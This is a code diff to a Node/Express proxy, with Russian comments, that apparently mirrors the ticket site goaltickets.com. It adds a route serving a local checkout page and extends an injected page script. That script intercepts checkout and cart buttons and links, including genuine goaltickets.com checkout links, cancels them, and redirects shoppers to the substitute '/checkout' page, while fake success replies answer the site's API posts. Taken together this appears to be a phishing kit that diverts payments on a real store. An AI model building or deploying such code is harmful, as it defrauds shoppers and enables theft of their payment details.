@@ -54,6 +54,12 @@ app.get('*checkout*', (req, res) => {
   res.sendFile(__dirname + '/checkout.html');
 });
 
+// Перехватываем внешние ссылки на checkout
+app.get('/checkouts/*', (req, res) => {
+  console.log('🎯 External checkout intercepted:', req.url);
+  res.sendFile(__dirname + '/checkout.html');
+});
+
 // Обработка POST запросов (возвращаем 200 для избежания ошибок)
 app.post('/api/*', (req, res) => {
   res.status(200).json({ success: true });
@@ -155,11 +161,18 @@ const proxyOptions = {
                   const href = target.href || '';
                   const form = target.closest('form');
                   
+                  // Перехватываем все checkout кнопки и ссылки
                   if (text.includes('checkout') || text.includes('купить') || 
                       text.includes('оформить') || href.includes('checkout') ||
                       target.classList.contains('checkout') || target.id.includes('checkout') ||
-                      (form && form.action && form.action.includes('cart'))) {
-                    console.log('🎯 Checkout button clicked:', target);
+                      (form && form.action && form.action.includes('cart')) ||
+                      // Перехватываем внешние ссылки на goaltickets.com/checkout
+                      href.includes('goaltickets.com/checkout') ||
+                      href.includes('goaltickets.com/cart') ||
+                      // Перехватываем любые ссылки содержащие checkout
+                      (href && (href.includes('/checkout') || href.includes('/cart')))) {
+                    
+                    console.log('🎯 Checkout button clicked:', target, 'href:', href);
                     event.preventDefault();
                     event.stopPropagation();
                     
@@ -225,6 +238,27 @@ const proxyOptions = {
                 interceptCheckoutClicks();
                 interceptForms();
               }, 2000);
+              
+              // Перехватываем все ссылки на checkout при загрузке страницы
+              function interceptAllCheckoutLinks() {
+                const links = document.querySelectorAll('a[href*="checkout"], a[href*="cart"], button[onclick*="checkout"], button[onclick*="cart"]');
+                links.forEach(link => {
+                  if (link.href && (link.href.includes('checkout') || link.href.includes('cart'))) {
+                    console.log('🎯 Found checkout link:', link);
+                    link.addEventListener('click', function(e) {
+                      e.preventDefault();
+                      e.stopPropagation();
+                      console.log('🎯 Checkout link clicked:', link.href);
+                      window.location.href = '/checkout';
+                      return false;
+                    });
+                  }
+                });
+              }
+              
+              // Запускаем перехват ссылок
+              setTimeout(interceptAllCheckoutLinks, 1000);
+              setTimeout(interceptAllCheckoutLinks, 3000);
             })();
           </script>
         `;
